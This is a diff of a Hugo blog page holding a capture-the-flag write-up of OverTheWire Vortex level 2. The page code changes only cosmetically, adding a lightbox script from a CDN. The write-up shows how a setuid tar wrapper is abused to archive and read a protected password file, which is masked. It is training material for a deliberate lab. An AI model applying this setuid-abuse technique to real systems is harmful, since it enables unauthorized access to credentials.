@@ -29,7 +29,7 @@ vortex2@melissa:~$ ls -l /etc/vortex_pass/vortex3 -r-------- 1 vortex3 vortex3 1
 
 
 
-<meta name="generator" content="Hugo 0.75.1" />
+<meta name="generator" content="Hugo 0.89.4" />
 
 <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" rel="stylesheet">
 <style type="text/css">/*https://coolors.co/afd5aa-f0f2ef-a69f98-3d3d3d-8c6057*/
@@ -45,6 +45,10 @@ vortex2@melissa:~$ ls -l /etc/vortex_pass/vortex3 -r-------- 1 vortex3 vortex3 1
 <link href='https://blog.dornea.nu/css/styles.css' rel="stylesheet">
 <link rel="stylesheet" href="https://blog.dornea.nu/css/custom.css">
 
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox/dist/css/glightbox.min.css" />
+<script src="https://cdn.jsdelivr.net/gh/mcstudios/glightbox/dist/js/glightbox.min.js"></script>
 
 
 <link rel="icon" 
@@ -90,7 +94,7 @@ type="image/x-icon"/>
   </p>
   <div class="lh-copy post-content"><p>Solution for <a href="http://www.overthewire.org/wargames/vortex/vortex2.shtml">level2</a>:</p>
 <p>Here is the code:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdlib.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdlib.h&gt;</span><span style="color:#cd2828;font-weight:bold">
 </span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#cd2828;font-weight:bold">
 </span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;sys/types.h&gt;</span><span style="color:#cd2828;font-weight:bold">
 </span><span style="color:#cd2828;font-weight:bold"></span>
@@ -101,15 +105,15 @@ type="image/x-icon"/>
         execv(args[<span style="color:#3677a9">0</span>], args);
 }
 </code></pre></div><p><strong>$$</strong> expands to the process ID of the shell.</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ echo $$
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ echo $$
 24489
 </code></pre></div><p>Let&rsquo;s make some observations:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">vortex2@melissa:~$ ls -l /etc/vortex_pass/vortex3 
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">vortex2@melissa:~$ ls -l /etc/vortex_pass/vortex3 
 -r-------- 1 vortex3 vortex3 10 2011-11-14 18:15 /etc/vortex_pass/vortex3
 vortex2@melissa:~$ ls -l /vortex/vortex2
 -r-sr-x--- 1 vortex3 vortex2 7134 2011-11-13 23:07 /vortex/vortex2
 </code></pre></div><p>The password file is owned by <strong>vortex3</strong>. And the binary <strong>/vortex/vortex3</strong> is allowed to read this file. So we are allowed to tar this file using the binary. The binary itself expects 3 arguments. There we go:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">vortex2@melissa:/etc/vortex_pass$ /vortex/vortex2 vortex3 vortex3 vortex3 
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">vortex2@melissa:/etc/vortex_pass$ /vortex/vortex2 vortex3 vortex3 vortex3 
 /bin/tar: U\211\345WVS\350Z: Cannot stat: No such file or directory
 /bin/tar: Exiting with failure status due to previous errors
 vortex2@melissa:/etc/vortex_pass$ ls -l &#39;/tmp/ownership.$$.tar&#39;
@@ -118,7 +122,7 @@ vortex2@melissa:/etc/vortex_pass$ cd /tmp/****
 vortex2@melissa:/tmp/****$ cp &#39;/tmp/ownership.$$.tar&#39; .
 cp: cannot create regular file `./ownership.$$.tar&#39;: Permission denied
 </code></pre></div><p>Obviously we are not allowed to copy/untar the file. What about STDOUT?</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ tar xf &#39;/tmp/ownership.$$.tar&#39; -O
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ tar xf &#39;/tmp/ownership.$$.tar&#39; -O
 *******
 </code></pre></div><p>Password revealed. Next level!</p>
 </div>
@@ -226,6 +230,13 @@ function topFunction() {
 
 
 
+
+
+<script>
+ var glightbox = GLightbox({
+     selector: '.glightbox'
+ });
+</script>
 
   
 </body>
